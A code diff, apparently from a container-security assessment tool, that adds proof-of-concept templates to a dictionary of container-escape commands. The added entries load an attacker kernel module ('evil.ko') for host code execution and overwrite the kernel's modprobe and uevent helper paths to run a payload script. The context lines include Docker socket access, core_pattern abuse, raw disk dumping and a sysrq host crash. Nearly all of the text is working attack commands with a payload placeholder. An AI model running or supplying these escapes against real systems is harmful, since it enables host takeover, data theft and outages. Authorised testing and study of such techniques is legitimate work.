@@ -39,6 +39,11 @@ POC_TEMPLATES: dict[str, str] = {
         "# Manipulate network routing to intercept traffic\nip route add {target_network} via {gateway} dev eth0"
     ),
     "cap_sys_rawio": ("# Direct disk read via raw I/O\ndd if=/dev/{host_device} of=/tmp/disk_dump bs=512 count=1024"),
+    "cap_sys_module": (
+        "# Load an attacker kernel module for ring-0 host code execution.\n"
+        "# Build a .ko whose init calls call_usermodehelper to run: {payload_command}\n"
+        "make -C /lib/modules/$(uname -r)/build M=/tmp modules && insmod /tmp/evil.ko"
+    ),
     # ── MOUNT ─────────────────────────────────────────────────────
     "docker_socket_mount": ("curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"),
     "procfs_core_pattern": (
@@ -46,6 +51,18 @@ POC_TEMPLATES: dict[str, str] = {
         "echo '{payload_command}' > /tmp/payload.sh && "
         "chmod +x /tmp/payload.sh && "
         "sleep 1 && kill -SEGV $$"
+    ),
+    "procfs_modprobe_path": (
+        "# Repoint the modprobe helper, then trigger an auto-modprobe\n"
+        "echo -e '#!/bin/sh\\n{payload_command}' > /tmp/x.sh && chmod +x /tmp/x.sh && "
+        "echo /tmp/x.sh > /proc/sys/kernel/modprobe && "
+        "printf '\\xff\\xff\\xff\\xff' > /tmp/trigger && chmod +x /tmp/trigger && /tmp/trigger 2>/dev/null"
+    ),
+    "sysfs_uevent_helper": (
+        "# Repoint the uevent helper, then trigger a uevent\n"
+        "echo -e '#!/bin/sh\\n{payload_command}' > /tmp/x.sh && chmod +x /tmp/x.sh && "
+        "echo /tmp/x.sh > /sys/kernel/uevent_helper && "
+        "echo change > /sys/class/mem/null/uevent"
     ),
     "procfs_sysrq": ("# Trigger host kernel crash (DANGEROUS)\necho c > /proc/sysrq-trigger"),
     "sysfs_hugepages": (
